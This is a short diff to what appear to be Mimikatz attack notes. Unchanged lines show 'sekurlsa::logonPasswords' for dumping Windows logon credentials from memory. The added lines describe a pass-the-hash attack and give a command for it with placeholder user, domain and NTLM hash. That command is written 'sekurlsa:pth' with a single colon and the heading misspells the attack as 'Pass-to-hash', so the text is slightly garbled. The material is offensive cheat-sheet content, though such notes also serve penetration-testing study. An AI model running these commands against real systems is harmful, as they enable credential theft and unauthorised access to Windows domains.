@@ -5,3 +5,8 @@
 ```
 sekurlsa::logonPasswords
 ```
+
+Pass-to-hash attack: accept an authenticated user based on the hash to execute the action
+```
+sekurlsa:pth /user:<name> /domain:<domain> /ntlm:<hash>
+```
